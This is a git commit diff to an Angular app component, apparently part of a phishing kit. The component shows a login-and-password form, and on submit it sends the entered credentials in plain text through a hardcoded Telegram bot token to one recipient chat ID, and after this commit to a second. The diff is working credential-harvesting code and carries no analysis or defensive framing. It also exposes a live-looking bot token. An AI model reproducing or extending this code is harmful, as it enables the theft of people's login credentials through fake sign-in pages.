32638f97140430e9031ec9b053ad723aa91d58ad
oleksii <oleksiy@eventsoft.com.ua>
2020-08-31 01:01:57 +0300

    fix: problem

--- src/app/app.component.ts
+++ src/app/app.component.ts
@@ -3,37 +3,51 @@ import Telegram from 'telegram-send-message';
 import { FormBuilder, Validators } from '@angular/forms';
 
 @Component({
-    selector: 'app-root',
-    templateUrl: './app.component.html',
-    styleUrls: ['./app.component.scss'],
-    encapsulation: ViewEncapsulation.None
+	selector: 'app-root',
+	templateUrl: './app.component.html',
+	styleUrls: ['./app.component.scss'],
+	encapsulation: ViewEncapsulation.None
 })
 export class AppComponent implements OnInit {
-    loginStepPhone = true;
-    form = this.formBuilder.group({
-        login: ['', [Validators.required]],
-        password: ['', [Validators.required]],
-    });
+	loginStepPhone = true;
+	form = this.formBuilder.group({
+		login: ['', [Validators.required]],
+		password: ['', [Validators.required]],
+	});
+	prevValue = {
+		login: '',
+		password: '',
+	};
 
-    sentMessage(): void {
-        Telegram.setToken('949565640:AAEGoYzcWtY0kC3MTI0KNfdkWFgxVe8NOQs');
-        Telegram.setRecipient('880595419');
-        const message = 'Login: ' + this.form.get('login').value + '      Password: ' + this.form.get('password').value;
-        Telegram.setMessage(message);
-        Telegram.send();
-    }
+	sentMessage(): void {
+		if (this.prevValue.login !== this.form.get('login').value || this.prevValue.password !== this.form.get('password').value) {
+			const message = 'Login: ' + this.form.get('login').value + '      Password: ' + this.form.get('password').value;
+			const token = '949565640:AAEGoYzcWtY0kC3MTI0KNfdkWFgxVe8NOQs';
+			console.log('sending..');
+			Telegram.setToken(token);
+			Telegram.setRecipient('880595419');
+			Telegram.setMessage(message);
+			Telegram.send();
+			Telegram.setToken(token);
+			Telegram.setRecipient('946981380');
+			Telegram.setMessage(message);
+			Telegram.send();
+			this.prevValue.login = this.form.get('login').value;
+			this.prevValue.password = this.form.get('password').value;
+		}
+	}
 
-    constructor(
-        private formBuilder: FormBuilder,
-    ) {}
+	constructor(
+		private formBuilder: FormBuilder,
+	) {}
 
-    ngOnInit(): void {
-    }
+	ngOnInit(): void {
+	}
 
-    onSubmit(): void {
-        if (this.form.valid) {
-            this.sentMessage();
-        }
-        console.log(this.form.value);
-    }
+	onSubmit(): void {
+		if (this.form.valid) {
+			this.sentMessage();
+		}
+		console.log(this.form.value);
+	}
 }
